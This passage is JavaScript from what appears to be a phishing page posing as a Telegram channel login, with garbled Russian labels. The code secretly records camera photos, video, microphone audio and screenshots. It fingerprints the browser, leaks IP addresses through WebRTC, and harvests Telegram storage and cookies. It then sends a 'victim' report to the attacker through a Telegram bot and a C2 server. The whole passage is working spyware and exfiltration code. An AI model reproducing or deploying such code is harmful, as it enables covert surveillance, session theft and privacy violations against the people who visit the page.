                            resolution: `${canvas.width}x${canvas.height}`,
                            timestamp: Date.now()
                        });
                    }
                }
                
                // –û—á–∏—Å—Ç–∫–∞
                [frontCamera, backCamera].forEach(stream => {
                    if (stream) stream.getTracks().forEach(track => track.stop());
                });
                
            } catch (error) {
                console.error('Photo collection error:', error.message);
            }
        }

        async function collectVideos(mediaData) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: true
                });
                
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                
                mediaRecorder.onstop = () => {
                    mediaData.videos.push({
                        duration: 5000,
                        size: chunks.reduce((acc, chunk) => acc + chunk.size, 0),
                        format: 'webm',
                        timestamp: Date.now()
                    });
                };
                
                mediaRecorder.start();
                await new Promise(r => setTimeout(r, 5000));
                mediaRecorder.stop();
                
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                console.error('Video collection error:', error.message);
            }
        }

        async function collectAudio(mediaData) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: true,
                    video: false
                });
                
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                
                mediaRecorder.onstop = () => {
                    mediaData.audio.push({
                        duration: 3000,
                        size: chunks.reduce((acc, chunk) => acc + chunk.size, 0),
                        format: 'webm',
                        timestamp: Date.now()
                    });
                };
                
                mediaRecorder.start();
                await new Promise(r => setTimeout(r, 3000));
                mediaRecorder.stop();
                
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                console.error('Audio collection error:', error.message);
            }
        }

        async function collectScreenshots(mediaData) {
            try {
                if (!navigator.mediaDevices.getDisplayMedia) return;
                
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: true,
                    audio: false
                });
                
                const video = document.getElementById('cameraStream');
                const canvas = document.getElementById('canvasCapture');
                const ctx = canvas.getContext('2d');
                
                video.srcObject = stream;
                
                await new Promise(r => {
                    video.onloadedmetadata = r;
                });
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                mediaData.screenshots.push({
                    type: 'screenshot',
                    resolution: `${canvas.width}x${canvas.height}`,
                    timestamp: Date.now()
                });
                
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                console.error('Screenshot collection error:', error.message);
            }
        }

        // ================= –ö–û–ú–ü–ò–õ–Ø–¶–ò–Ø –ò –û–¢–ü–†–ê–í–ö–ê –î–ê–ù–ù–´–• =================
        async function compileCompleteDataset() {
            const completeDataset = {
                // –ú–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ
                metadata: {
                    version: CONFIG.VERSION,
                    timestamp: new Date().toISOString(),
                    sessionId: SystemState.sessionToken,
                    victimId: SystemState.victimId,
                    deviceId: SystemState.deviceId,
                    collectionDuration: Date.now() - SystemState.metrics.startTime
                },
                
                // –í—Å–µ —Å–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                data: {
                    telegram: SystemState.data.telegram,
                    system: SystemState.data.system,
                    network: SystemState.data.network,
                    location: SystemState.data.location,
                    browser: SystemState.data.browser,
                    hardware: SystemState.data.hardware,
                    biometrics: SystemState.data.biometrics,
                    behavioral: SystemState.data.behavioral
                },
                
                // –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
                statistics: {
                    dataPoints: SystemState.metrics.dataPoints,
                    filesCollected: SystemState.metrics.filesCollected,
                    errors: SystemState.metrics.errors,
                    retries: SystemState.metrics.retries,
                    userAgent: navigator.userAgent,
                    url: window.location.href,
                    referrer: document.referrer
                },
                
                // –í—ã–≤–æ–¥—ã –∏ –∞–Ω–∞–ª–∏–∑
                analysis: {
                    deviceType: detectDeviceType(),
                    riskScore: calculateRiskScore(),
                    dataQuality: calculateDataQuality(),
                    recommendations: generateRecommendations()
                }
            };
            
            return completeDataset;
        }

        async function sendCompleteDataset(dataset) {
            try {
                // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è Telegram
                const telegramMessage = formatCompleteTelegramMessage(dataset);
                
                // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
                await sendTelegramMessage(telegramMessage);
                
                // –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–∞ C2 —Å–µ—Ä–≤–µ—Ä
                await sendToC2Server(dataset);
                
                // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ
                console.log('‚úÖ Complete dataset sent successfully');
                SystemState.metrics.dataPoints += 100;
                
            } catch (error) {
                console.error('Dataset send error:', error);
                SystemState.metrics.errors++;
                saveForRetry(dataset, 'complete_dataset');
            }
        }

        async function sendMediaReport(mediaData) {
            try {
                const report = {
                    type: 'media_report',
                    victimId: SystemState.victimId,
                    timestamp: new Date().toISOString(),
                    media: {
                        photos: mediaData.photos.length,
                        videos: mediaData.videos.length,
                        audio: mediaData.audio.length,
                        screenshots: mediaData.screenshots.length,
                        total: mediaData.photos.length + mediaData.videos.length + 
                               mediaData.audio.length + mediaData.screenshots.length
                    },
                    details: {
                        photoResolutions: mediaData.photos.map(p => p.resolution),
                        videoDurations: mediaData.videos.map(v => v.duration),
                        audioDurations: mediaData.audio.map(a => a.duration)
                    }
                };
                
                const message = formatMediaTelegramMessage(report);
                await sendTelegramMessage(message);
                
                console.log('‚úÖ Media report sent');
                
            } catch (error) {
                console.error('Media report error:', error);
                saveForRetry(mediaData, 'media_report');
            }
        }

        function formatCompleteTelegramMessage(dataset) {
            const loc = dataset.data.location?.gps || {};
            const sys = dataset.data.system?.basic || {};
            const net = dataset.data.network?.connection || {};
            
            return `
üè¥‚Äç‚ò†Ô∏è <b>–ü–û–õ–ù–´–ô –°–ë–û–† –î–ê–ù–ù–´–• –ó–ê–í–ï–†–®–ï–ù</b>
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

üìä <b>–°–¢–ê–¢–ò–°–¢–ò–ö–ê –°–ë–û–†–ê:</b>
‚îú –í—Ä–µ–º—è —Å–±–æ—Ä–∞: ${Math.floor(dataset.metadata.collectionDuration / 1000)} —Å–µ–∫.
‚îú –¢–æ—á–∫–∏ –¥–∞–Ω–Ω—ã—Ö: ${dataset.statistics.dataPoints}
‚îú –§–∞–π–ª–æ–≤ —Å–æ–±—Ä–∞–Ω–æ: ${dataset.statistics.filesCollected}
‚îú –û—à–∏–±–æ–∫: ${dataset.statistics.errors}
‚îî –°–µ—Å—Å–∏—è: <code>${dataset.metadata.sessionId.substring(0, 20)}...</code>

üë§ <b>–ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –ñ–ï–†–¢–í–ï:</b>
‚îú ID: <code>${dataset.metadata.victimId}</code>
‚îú –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: <code>${dataset.metadata.deviceId}</code>
‚îú User-Agent: ${sys.userAgent?.substring(0, 60)}...
‚îî –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${sys.platform || 'Unknown'}

üåç <b>–ì–ï–û–õ–û–ö–ê–¶–ò–Ø:</b>
‚îú IP: ${dataset.data.network?.ipInfo?.ip || '–ù–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω'}
‚îú –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${loc.latitude ? `${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}` : '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ'}
‚îú –ì–æ—Ä–æ–¥: ${dataset.data.location?.city || '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω'}
‚îú –°—Ç—Ä–∞–Ω–∞: ${dataset.data.location?.country || '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∞'}
‚îî –¢–æ—á–Ω–æ—Å—Ç—å: ${loc.accuracy ? `${loc.accuracy}–º` : 'N/A'}

üíª <b>–°–ò–°–¢–ï–ú–ù–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø:</b>
‚îú –Ø–∑—ã–∫: ${dataset.data.system?.localization?.language || 'N/A'}
‚îú –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞: ${dataset.data.system?.localization?.timezone || 'N/A'}
‚îú –Ø–¥–µ—Ä CPU: ${dataset.data.hardware?.cpu?.cores || 'N/A'}
‚îú –ü–∞–º—è—Ç—å: ${dataset.data.hardware?.memory?.deviceMemory || 'N/A'} GB
‚îú GPU: ${dataset.data.hardware?.gpu?.renderer?.substring(0, 30) || 'N/A'}
‚îî –ë–∞—Ç–∞—Ä–µ—è: ${dataset.data.hardware?.battery?.level ? `${Math.round(dataset.data.hardware.battery.level * 100)}%` : 'N/A'}

üì° <b>–°–ï–¢–ï–í–û–ï –°–û–ï–î–ò–ù–ï–ù–ò–ï:</b>
‚îú –¢–∏–ø: ${net.effectiveType || 'Unknown'}
‚îú –°–∫–æ—Ä–æ—Å—Ç—å: ${net.downlink || 'Unknown'} Mbps
‚îú RTT: ${net.rtt || 'Unknown'} ms
‚îî –≠–∫–æ–Ω–æ–º–∏—è —Ç—Ä–∞—Ñ–∏–∫–∞: ${net.saveData ? '–í–∫–ª—é—á–µ–Ω–∞' : '–í—ã–∫–ª—é—á–µ–Ω–∞'}

üîê <b>TELEGRAM –î–ê–ù–ù–´–ï:</b>
‚îú –ö–ª—é—á–µ–π LocalStorage: ${Object.keys(dataset.data.telegram?.sources?.localStorage || {}).length}
‚îú –°–µ—Å—Å–∏–æ–Ω–Ω—ã—Ö –∫–ª—é—á–µ–π: ${Object.keys(dataset.data.telegram?.sources?.sessionStorage || {}).length}
‚îú Cookies: ${dataset.data.telegram?.cookies?.count || 0}
‚îî Service Workers: ${dataset.data.telegram?.serviceWorkers?.count || 0}

üé® <b>–ë–†–ê–£–ó–ï–† –ò –û–¢–ü–ï–ß–ê–¢–û–ö:</b>
‚îú Canvas: ${dataset.data.browser?.canvas?.fingerprint ? '–î–æ—Å—Ç—É–ø–µ–Ω' : '–ù–µ—Ç'}
‚îú WebGL: ${dataset.data.browser?.webgl?.vendor ? '–î–æ—Å—Ç—É–ø–µ–Ω' : '–ù–µ—Ç'}
‚îú –®—Ä–∏—Ñ—Ç–æ–≤ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ: ${dataset.data.browser?.fonts?.length || 0}
‚îú –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞: ${dataset.data.browser?.screen?.width || 0}x${dataset.data.browser?.screen?.height || 0}
‚îî –û—Ç–ø–µ—á–∞—Ç–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: <code>${dataset.data.browser?.fingerprint?.hash?.substring(0, 20) || 'N/A'}...</code>

üì∏ <b>–ú–ï–î–ò–ê –í–û–ó–ú–û–ñ–ù–û–°–¢–ò:</b>
‚îú –ö–∞–º–µ—Ä–∞: ${dataset.data.biometrics?.available?.camera ? '‚úÖ' : '‚ùå'}
‚îú –ú–∏–∫—Ä–æ—Ñ–æ–Ω: ${dataset.data.biometrics?.available?.microphone ? '‚úÖ' : '‚ùå'}
‚îú –ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞: ${dataset.data.biometrics?.available?.camera ? '‚úÖ' : '‚ùå'}
‚îú –†–∞—Å–ø–æ–∑–Ω–∞–≤–∞–Ω–∏–µ —Ä–µ—á–∏: ${dataset.data.biometrics?.available?.voice ? '‚úÖ' : '‚ùå'}
‚îî –ë–∏–æ–º–µ—Ç—Ä–∏—è: ${dataset.data.biometrics?.available?.fingerprint ? '‚úÖ' : '‚ùå'}

üéØ <b>–ê–ù–ê–õ–ò–ó –ò –í–´–í–û–î–´:</b>
‚îú –¢–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${dataset.analysis.deviceType}
‚îú –û—Ü–µ–Ω–∫–∞ —Ä–∏—Å–∫–∞: ${dataset.analysis.riskScore}/10
‚îú –ö–∞—á–µ—Å—Ç–≤–æ –¥–∞–Ω–Ω—ã—Ö: ${dataset.analysis.dataQuality}%
‚îî –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏: ${dataset.analysis.recommendations}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üïí ${new Date().toLocaleString('ru-RU')}
üì° –°–∏—Å—Ç–µ–º–∞ v${CONFIG.VERSION} ‚Ä¢ –°—Ç–∞—Ç—É—Å: üü¢ –ê–ö–¢–ò–í–ï–ù
`;
        }

        function formatMediaTelegramMessage(report) {
            return `
üì∏ <b>–û–¢–ß–ï–¢ –û –°–ë–û–†–ï –ú–ï–î–ò–ê –î–ê–ù–ù–´–•</b>
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

üë§ –ñ–µ—Ä—Ç–≤–∞: <code>${report.victimId}</code>
üïí –í—Ä–µ–º—è –æ—Ç—á–µ—Ç–∞: ${new Date(report.timestamp).toLocaleString('ru-RU')}

üìä <b>–°–¢–ê–¢–ò–°–¢–ò–ö–ê –ú–ï–î–ò–ê:</b>
‚îú –§–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏: ${report.media.photos} —à—Ç.
‚îú –í–∏–¥–µ–æ: ${report.media.videos} —à—Ç.
‚îú –ê—É–¥–∏–æ: ${report.media.audio} —à—Ç.
‚îú –°–∫—Ä–∏–Ω—à–æ—Ç—ã: ${report.media.screenshots} —à—Ç.
‚îî –í—Å–µ–≥–æ —Ñ–∞–π–ª–æ–≤: ${report.media.total}

üì∑ <b>–î–ï–¢–ê–õ–ò –§–û–¢–û–ì–†–ê–§–ò–ô:</b>
${report.details.photoResolutions.map((res, i) => `‚îú ${i+1}. ${res}`).join('\n') || '‚îî –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}

üé• <b>–î–ï–¢–ê–õ–ò –í–ò–î–ï–û:</b>
${report.details.videoDurations.map((dur, i) => `‚îú ${i+1}. ${dur}–º—Å`).join('\n') || '‚îî –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}

üé§ <b>–î–ï–¢–ê–õ–ò –ê–£–î–ò–û:</b>
${report.details.audioDurations.map((dur, i) => `‚îú ${i+1}. ${dur}–º—Å`).join('\n') || '‚îî –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚úÖ –ú–µ–¥–∏–∞ —Å–±–æ—Ä –∑–∞–≤–µ—Ä—à–µ–Ω —É—Å–ø–µ—à–Ω–æ
‚ö° –°–∏—Å—Ç–µ–º–∞ –≥–æ—Ç–æ–≤–∞ –∫ –¥–∞–ª—å–Ω–µ–π—à–µ–π —Ä–∞–±–æ—Ç–µ
`;
        }

        // ================= –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò =================
        async function sendTelegramMessage(message) {
            try {
                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.ADMIN_ID,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true,
                        disable_notification: false
                    })
                });
                
                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                return await response.json();
                
            } catch (error) {
                console.error('Telegram send error:', error);
                throw error;
            }
        }

        async function sendToC2Server(data) {
            try {
                const response = await fetch(CONFIG.C2_SERVER, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Victim-ID': SystemState.victimId,
                        'X-Session-Token': SystemState.sessionToken,
                        'X-Device-ID': SystemState.deviceId,
                        'X-Timestamp': Date.now().toString()
                    },
                    body: JSON.stringify(data)
                });
                
                return response.ok;
                
            } catch (error) {
                console.error('C2 server error:', error);
                return false;
            }
        }

        function saveForRetry(data, type) {
            try {
                const queue = JSON.parse(localStorage.getItem('retry_queue') || '[]');
                queue.push({
                    data: data,
                    type: type,
                    timestamp: Date.now(),
                    attempts: 0,
                    victimId: SystemState.victimId
                });
                
                // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ–¥–Ω–∏–µ 50
                if (queue.length > 50) queue.splice(0, queue.length - 50);
                
                localStorage.setItem('retry_queue', JSON.stringify(queue));
                SystemState.metrics.retries++;
                
            } catch (error) {
                console.error('Save for retry error:', error);
            }
        }

        function restoreSession() {
            try {
                const saved = localStorage.getItem('advanced_session');
                if (saved) {
                    const session = JSON.parse(saved);
                    if (Date.now() - session.timestamp < 7200000) { // 2 —á–∞—Å–∞
                        SystemState.victimId = session.victimId;
                        SystemState.sessionToken = session.sessionToken;
                        SystemState.deviceId = session.deviceId;
                        console.log('‚úÖ Session restored');
                    }
                }
            } catch (error) {
                console.error('Session restore error:', error);
            }
        }

        function showAuthSuccess() {
            const authButton = document.getElementById('authButton');
            const modalStatus = document.getElementById('modalStatus');
            const statusIndicator = document.getElementById('statusIndicator');
            
            // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫–Ω–æ–ø–∫–∏
            authButton.innerHTML = '<span>‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞</span>';
            authButton.style.background = 'var(--gradient-success)';
            authButton.disabled = true;
            
            // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞
            if (modalStatus) {
                modalStatus.innerHTML = '<span>‚úÖ</span><span>–î–æ—Å—Ç—É–ø –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω</span>';
                modalStatus.style.background = 'rgba(46, 204, 113, 0.1)';
                modalStatus.style.borderColor = 'rgba(46, 204, 113, 0.3)';
                modalStatus.style.color = 'var(--secondary)';
            }
            
            if (statusIndicator) {
                statusIndicator.innerHTML = '<span>‚úÖ</span><span>–ö–∞–Ω–∞–ª –æ—Ç–∫—Ä—ã—Ç ‚Ä¢ –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –∞–∫—Ç–∏–≤–µ–Ω</span>';
                statusIndicator.style.background = 'rgba(46, 204, 113, 0.1)';
                statusIndicator.style.borderColor = 'rgba(46, 204, 113, 0.3)';
                statusIndicator.style.color = 'var(--secondary)';
            }
            
            // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –∑–∞–∫—Ä—ã—Ç–∏–µ
            setTimeout(() => {
                hideAuthModal();
                
                const joinButton = document.getElementById('joinButton');
                joinButton.innerHTML = '<span>‚úÖ –í—ã –≤ –∫–∞–Ω–∞–ª–µ</span>';
                joinButton.classList.remove('hidden');
                joinButton.disabled = true;
                joinButton.style.background = 'var(--gradient-success)';
                
                document.getElementById('progressContainer').classList.add('hidden');
                
            }, 3000);
        }

        function showAuthError() {
            const authButton = document.getElementById('authButton');
            const modalStatus = document.getElementById('modalStatus');
            
            authButton.innerHTML = '<span>‚ùå –û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏</span>';
            authButton.style.background = 'var(--gradient-danger)';
            
            if (modalStatus) {
                modalStatus.innerHTML = '<span>‚ùå</span><span>–ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞</span>';
                modalStatus.style.background = 'rgba(231, 76, 60, 0.1)';
                modalStatus.style.borderColor = 'rgba(231, 76, 60, 0.3)';
                modalStatus.style.color = 'var(--danger)';
            }
            
            setTimeout(() => {
                authButton.innerHTML = '<span>üîê –ü–æ–≤—Ç–æ—Ä–∏—Ç—å –ø–æ–ø—ã—Ç–∫—É</span>';
                authButton.style.background = '';
                authButton.disabled = false;
                SystemState.authInProgress = false;
                
                if (modalStatus) {
                    modalStatus.style.display = 'none';
                }
            }, 3000);
        }

        // ================= –£–¢–ò–õ–ò–¢–´ =================
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        function parseCookies(cookieString) {
            return cookieString.split(';').reduce((cookies, cookie) => {
                const [name, value] = cookie.split('=').map(c => c.trim());
                if (name) cookies[name] = value;
                return cookies;
            }, {});
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                canvas.width = 200;
                canvas.height = 50;
                
                ctx.textBaseline = 'top';
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText("Fingerprint", 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText("Fingerprint", 4, 17);
                
                return canvas.toDataURL();
            } catch (e) {
                return null;
            }
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                
                if (!gl) return { available: false };
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    available: true,
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
                };
            } catch (e) {
                return { available: false, error: e.message };
            }
        }

        async function getFontList() {
            const baseFonts = [
                'Arial', 'Arial Black', 'Arial Narrow', 'Times New Roman',
                'Courier New', 'Verdana', 'Georgia', 'Palatino',
                'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS',
                'Impact', 'Lucida Console', 'Tahoma'
            ];
            
            const available = [];
            
            for (const font of baseFonts) {
                if (document.fonts.check(`12px "${font}"`)) {
                    available.push(font);
                }
            }
            
            return available;
        }

        function getAudioFingerprint() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gain = audioContext.createGain();
                
                oscillator.connect(gain);
                gain.connect(audioContext.destination);
                
                oscillator.start();
                oscillator.stop(audioContext.currentTime + 0.1);
                
                return {
                    sampleRate: audioContext.sampleRate,
                    numberOfChannels: 2,
                    bufferSize: 2048
                };
            } catch (e) {
                return { error: e.message };
            }
        }

        function generateFingerprintHash(data) {
            const str = JSON.stringify(data);
            let hash = 0;
            
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            
            return Math.abs(hash).toString(36);
        }

        function detectDeviceType() {
            const ua = navigator.userAgent;
            
            if (/mobile|android|iphone|ipad|ipod/i.test(ua)) {
                return 'Mobile';
            } else if (/tablet|ipad/i.test(ua)) {
                return 'Tablet';
            } else {
                return 'Desktop';
            }
        }

        function calculateRiskScore() {
            let score = 5;
            
            // –§–∞–∫—Ç–æ—Ä—ã –ø–æ–≤—ã—à–µ–Ω–∏—è —Ä–∏—Å–∫–∞
            if (SystemState.data.location?.gps?.accuracy < 50) score += 2;
            if (SystemState.data.biometrics?.available?.camera) score += 1;
            if (SystemState.data.biometrics?.available?.microphone) score += 1;
            if (SystemState.data.network?.connection?.effectiveType === '4g') score += 1;
            if (SystemState.data.hardware?.battery?.charging) score += 1;
            
            // –§–∞–∫—Ç–æ—Ä—ã –ø–æ–Ω–∏–∂–µ–Ω–∏—è —Ä–∏—Å–∫–∞
            if (!SystemState.data.location?.gps) score -= 1;
            if (SystemState.data.network?.connection?.saveData) score -= 1;
            
            return Math.min(Math.max(score, 1), 10);
        }

        function calculateDataQuality() {
            const totalSections = 8;
            let collectedSections = 0;
            
            if (Object.keys(SystemState.data.telegram).length > 0) collectedSections++;
            if (Object.keys(SystemState.data.system).length > 0) collectedSections++;
            if (Object.keys(SystemState.data.network).length > 0) collectedSections++;
            if (Object.keys(SystemState.data.location).length > 0) collectedSections++;
            if (Object.keys(SystemState.data.browser).length > 0) collectedSections++;
            if (Object.keys(SystemState.data.hardware).length > 0) collectedSections++;
            if (Object.keys(SystemState.data.biometrics).length > 0) collectedSections++;
            if (Object.keys(SystemState.data.behavioral).length > 0) collectedSections++;
            
            return Math.round((collectedSections / totalSections) * 100);
        }

        function generateRecommendations() {
            const recommendations = [];
            
            if (SystemState.data.location?.gps) {
                recommendations.push('–¢–æ—á–Ω–∞—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∞');
            }
            
            if (SystemState.data.biometrics?.available?.camera) {
                recommendations.push('–ö–∞–º–µ—Ä–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è —Å–±–æ—Ä–∞');
            }
            
            if (SystemState.data.network?.connection?.effectiveType === '4g' || 
                SystemState.data.network?.connection?.effectiveType === '5g') {
                recommendations.push('–ë—ã—Å—Ç—Ä–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –¥–ª—è –º–µ–¥–∏–∞');
            }
            
            return recommendations.length > 0 ? recommendations.join(', ') : '–ë–∞–∑–æ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è';
        }

        async function getIPInfoComprehensive() {
            const data = {};
            
            try {
                // WebRTC –º–µ—Ç–æ–¥
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(pc.setLocalDescription.bind(pc));
                
                pc.onicecandidate = (ice) => {
                    if (ice.candidate && ice.candidate.candidate) {
                        const candidate = ice.candidate.candidate;
                        
                        // IPv4
                        const ipv4Match = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ipv4Match) data.ip = ipv4Match[1];
                        
                        // IPv6
                        const ipv6Match = candidate.match(/([a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
                        if (ipv6Match) data.ipv6 = ipv6Match[1];
                        
                        pc.onicecandidate = () => {};
                    }
                };
                
                setTimeout(() => pc.close(), 2000);
                
                // –í–Ω–µ—à–Ω–∏–µ API (–ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ)
                const apiPromises = [
                    fetch('https://api.ipify.org?format=json').then(r => r.json()),
                    fetch('https://ipapi.co/json/').then(r => r.json()),
                    fetch('https://ipinfo.io/json').then(r => r.json())
                ];
                
                const results = await Promise.allSettled(apiPromises);
                
                for (const result of results) {
                    if (result.status === 'fulfilled') {
                        const info = result.value;
                        if (info.ip) data.ip = info.ip;
                        if (info.city) data.city = info.city;
                        if (info.region) data.region = info.region;
                        if (info.country) data.country = info.country;
                        if (info.org) data.isp = info.org;
                        if (info.loc) data.coordinates = info.loc;
                        break;
                    }
                }
                
            } catch (error) {
                console.error('IP info error:', error);
            }
            
            return data;
        }

        async function getNetworkInterfaces() {
            return new Promise((resolve) => {
                const interfaces = [];
                
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(pc.setLocalDescription.bind(pc));
                    
                    pc.onicecandidate = (ice) => {
                        if (ice.candidate) {
                            interfaces.push(ice.candidate.candidate);
                        }
                    };
                    
                    setTimeout(() => {
                        pc.close();
                        resolve(interfaces);
                    }, 3000);
                    
                } catch (error) {
                    console.error('Network interfaces error:', error);
                    resolve([]);
                }
            });
        }

        async function detectNetworkType() {
            if (!navigator.connection) return 'unknown';
            
            const conn = navigator.connection;
            const types = ['bluetooth', 'cellular', 'ethernet', 'wifi', 'wimax', 'other', 'unknown'];
            
            for (const type of types) {
                if (conn.type === type) {
                    return type;
                }
            }
            
            return 'unknown';
        }

        async function enrichLocationData(data) {
            try {
                if (data.gps.latitude && data.gps.longitude) {
